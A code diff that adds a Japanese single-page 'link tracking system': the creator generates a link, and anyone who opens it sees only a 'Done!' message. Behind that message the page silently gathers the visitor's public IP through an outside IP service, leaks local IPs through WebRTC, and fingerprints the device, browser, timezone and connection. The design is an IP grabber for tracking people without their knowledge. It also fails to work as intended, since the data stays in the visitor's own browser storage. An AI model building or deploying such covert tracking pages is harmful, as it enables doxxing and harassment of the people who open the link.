@@ -1,1 +1,529 @@
-g
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>リンクトラッキングシステム</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at 20% 30%, rgba(220, 20, 60, 0.15) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 70%, rgba(139, 0, 0, 0.15) 0%, transparent 50%);
+            animation: pulse 8s ease-in-out infinite;
+            z-index: 0;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        
+        .container {
+            background: rgba(10, 0, 0, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.4);
+            width: 100%;
+            max-width: 1000px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
+            padding: 40px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
+        }
+        
+        .header p {
+            color: #ff6666;
+            font-size: 1.1rem;
+        }
+        
+        .create-section {
+            background: rgba(20, 0, 0, 0.6);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #8b0000, #dc143c);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(220, 20, 60, 0.5);
+            border: 1px solid rgba(255, 0, 0, 0.4);
+            margin-bottom: 20px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.7);
+            background: linear-gradient(135deg, #a00000, #ff1744);
+        }
+        
+        .link-display {
+            background: rgba(30, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border-left: 3px solid #dc143c;
+            display: none;
+        }
+        
+        .link-url {
+            font-family: 'Courier New', monospace;
+            color: #ff8888;
+            word-break: break-all;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+        }
+        
+        .copy-btn {
+            padding: 12px 24px;
+            background: #b54343;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #dc143c;
+            transform: scale(1.05);
+        }
+        
+        .visitors-section {
+            background: rgba(20, 0, 0, 0.6);
+            border-radius: 12px;
+            padding: 30px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            display: none;
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #ff6666;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .visitor-item {
+            background: rgba(30, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 3px solid #dc143c;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .visitor-item:hover {
+            background: rgba(40, 0, 0, 0.9);
+            transform: translateX(5px);
+        }
+        
+        .visitor-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .visitor-time {
+            color: #ff8888;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        
+        .visitor-ip {
+            color: #b9bbbe;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .visitor-details {
+            display: none;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
+        .detail-row {
+            display: grid;
+            grid-template-columns: 150px 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .detail-label {
+            color: #ff8888;
+            font-weight: 600;
+        }
+        
+        .detail-value {
+            color: #fff;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .completed-page {
+            text-align: center;
+            padding: 60px 20px;
+        }
+        
+        .completed-page h1 {
+            font-size: 3rem;
+            color: #ff3333;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+            animation: successPulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .status-message {
+            background: rgba(181, 67, 67, 0.2);
+            border: 1px solid #b54343;
+            color: #ff8585;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="creator-view">
+            <div class="header">
+                <h1>リンクトラッキングシステム</h1>
+                <p>リンクを作成して訪問者の情報を追跡</p>
+            </div>
+            
+            <div class="create-section">
+                <button id="create-link-btn" class="btn">リンクを自動作成</button>
+                
+                <div id="link-display" class="link-display">
+                    <div class="link-url" id="generated-link"></div>
+                    <button id="copy-link-btn" class="copy-btn">リンクをコピー</button>
+                </div>
+                
+                <div id="status-message" class="status-message"></div>
+            </div>
+            
+            <div id="visitors-section" class="visitors-section">
+                <h2 class="section-title">🔍 開いた人</h2>
+                <div id="visitors-list"></div>
+            </div>
+        </div>
+        
+        <div id="visitor-view" style="display: none;">
+            <div class="completed-page">
+                <h1>完了！</h1>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let linkId = null;
+        let checkInterval = null;
+        
+        // URLパラメータをチェック
+        const urlParams = new URLSearchParams(window.location.search);
+        const visitLinkId = urlParams.get('id');
+        
+        if (visitLinkId) {
+            // 訪問者ビュー
+            document.getElementById('creator-view').style.display = 'none';
+            document.getElementById('visitor-view').style.display = 'block';
+            
+            // 訪問者情報を送信
+            sendVisitorInfo(visitLinkId);
+        } else {
+            // 作成者ビュー
+            setupCreatorView();
+        }
+        
+        function setupCreatorView() {
+            document.getElementById('create-link-btn').addEventListener('click', createLink);
+            document.getElementById('copy-link-btn').addEventListener('click', copyLink);
+        }
+        
+        function createLink() {
+            linkId = generateId();
+            const link = `${window.location.origin}${window.location.pathname}?id=${linkId}`;
+            
+            document.getElementById('generated-link').textContent = link;
+            document.getElementById('link-display').style.display = 'block';
+            document.getElementById('visitors-section').style.display = 'block';
+            
+            showStatus('リンクが作成されました！');
+            
+            // 訪問者情報の定期チェック開始
+            if (checkInterval) clearInterval(checkInterval);
+            checkInterval = setInterval(() => loadVisitors(), 2000);
+        }
+        
+        function copyLink() {
+            const link = document.getElementById('generated-link').textContent;
+            navigator.clipboard.writeText(link).then(() => {
+                showStatus('リンクをコピーしました！');
+            });
+        }
+        
+        function generateId() {
+            return 'link_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
+        
+        function showStatus(message) {
+            const statusEl = document.getElementById('status-message');
+            statusEl.textContent = message;
+            statusEl.style.display = 'block';
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 3000);
+        }
+        
+        async function sendVisitorInfo(linkId) {
+            try {
+                const publicIP = await getPublicIP();
+                const localIPs = await getLocalIPs();
+                
+                const visitorData = {
+                    linkId: linkId,
+                    timestamp: new Date().toISOString(),
+                    publicIP: publicIP,
+                    localIPs: localIPs,
+                    userAgent: navigator.userAgent,
+                    browser: getBrowser(),
+                    os: getOS(),
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明',
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    platform: navigator.platform,
+                    connection: getConnectionInfo()
+                };
+                
+                // LocalStorageに保存
+                const storageKey = `visitors_${linkId}`;
+                let visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                visitors.push(visitorData);
+                localStorage.setItem(storageKey, JSON.stringify(visitors));
+                
+                console.log('訪問者情報を保存しました', visitorData);
+                
+            } catch (error) {
+                console.error('情報送信エラー:', error);
+            }
+        }
+        
+        function loadVisitors() {
+            if (!linkId) return;
+            
+            const storageKey = `visitors_${linkId}`;
+            const visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            
+            const listEl = document.getElementById('visitors-list');
+            listEl.innerHTML = '';
+            
+            if (visitors.length === 0) {
+                listEl.innerHTML = '<p style="color: #888; text-align: center;">まだ訪問者がいません</p>';
+                return;
+            }
+            
+            // 訪問者がいたら更新を停止
+            if (visitors.length > 0 && checkInterval) {
+                clearInterval(checkInterval);
+                checkInterval = null;
+                console.log('訪問者を確認しました。更新を停止します。');
+            }
+            
+            visitors.reverse().forEach((visitor, index) => {
+                const item = document.createElement('div');
+                item.className = 'visitor-item';
+                
+                const time = new Date(visitor.timestamp).toLocaleString('ja-JP');
+                
+                item.innerHTML = `
+                    <div class="visitor-header">
+                        <div class="visitor-time">訪問者 #${visitors.length - index}</div>
+                        <div class="visitor-ip">${visitor.publicIP}</div>
+                    </div>
+                    <div class="visitor-details" id="details-${index}">
+                        <div class="detail-row">
+                            <div class="detail-label">訪問時刻:</div>
+                            <div class="detail-value">${time}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">パブリックIP:</div>
+                            <div class="detail-value">${visitor.publicIP}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">ローカルIP:</div>
+                            <div class="detail-value">${visitor.localIPs.length > 0 ? visitor.localIPs.join(', ') : '取得失敗'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">OS:</div>
+                            <div class="detail-value">${visitor.os}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">ブラウザ:</div>
+                            <div class="detail-value">${visitor.browser}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">画面解像度:</div>
+                            <div class="detail-value">${visitor.screenResolution}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">メモリ:</div>
+                            <div class="detail-value">${visitor.deviceMemory}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">言語:</div>
+                            <div class="detail-value">${visitor.language}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">タイムゾーン:</div>
+                            <div class="detail-value">${visitor.timezone}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">プラットフォーム:</div>
+                            <div class="detail-value">${visitor.platform}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">接続情報:</div>
+                            <div class="detail-value">${visitor.connection || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">ユーザーエージェント:</div>
+                            <div class="detail-value">${visitor.userAgent}</div>
+                        </div>
+                    </div>
+                `;
+                
+                item.addEventListener('click', () => {
+                    const details = document.getElementById(`details-${index}`);
+                    details.style.display = details.style.display === 'block' ? 'none' : 'block';
+                });
+                
+                listEl.appendChild(item);
+            });
+        }
+        
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return '取得失敗';
+            }
+        }
+        
+        async function getLocalIPs() {
+            return new Promise(resolve => {
+                const ips = new Set();
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                
+                pc.createDataChannel("");
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    
+                    const parts = ice.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    
+                    if (ip && !ips.has(ip) && !ip.startsWith("127.") && !ip.startsWith("0.")) {
+                        ips.add(ip);
+                    }
+                    
+                    if (pc.iceGatheringState === "complete") {
+                        pc.close();
+                        resolve(Array.from(ips));
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(Array.from(ips));
+                }, 3000);
+            });
+        }
+        
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (/Windows/.test(userAgent)) return "Windows";
+            if (/Macintosh/.test(userAgent)) return "Mac OS";
+            if (/Linux/.test(userAgent)) return "Linux";
+            if (/Android/.test(userAgent)) return "Android";
+            if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
+            return "Unknown OS";
+        }
+        
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            if (/Edg/.test(userAgent)) return "Microsoft Edge";
+            if (/Chrome/.test(userAgent)) return "Google Chrome";
+            if (/Firefox/.test(userAgent)) return "Mozilla Firefox";
+            if (/Safari/.test(userAgent)) return "Safari";
+            if (/Opera|OPR/.test(userAgent)) return "Opera";
+            return "Unknown Browser";
+        }
+        
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return '不明';
+            
+            return `${conn.effectiveType || '不明'} (下り: ${conn.downlink || '不明'} Mbps, RTT: ${conn.rtt || '不明'} ms)`;
+        }
+    </script>
+</body>
+</html>
